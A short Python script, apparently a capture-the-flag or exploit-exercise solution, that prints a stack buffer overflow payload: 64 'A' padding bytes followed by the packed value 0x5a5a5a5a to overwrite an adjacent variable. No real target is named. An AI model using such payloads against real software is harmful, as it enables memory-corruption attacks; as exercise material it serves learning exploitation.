#!/usr/bin/env python

import struct

def p32(num):
	return struct.pack("<I", num).decode('latin-1')

offset = 0x40
value_to_overwrite = 0x5a5a5a5a

payload = offset * "A" + p32(value_to_overwrite)

print(payload)
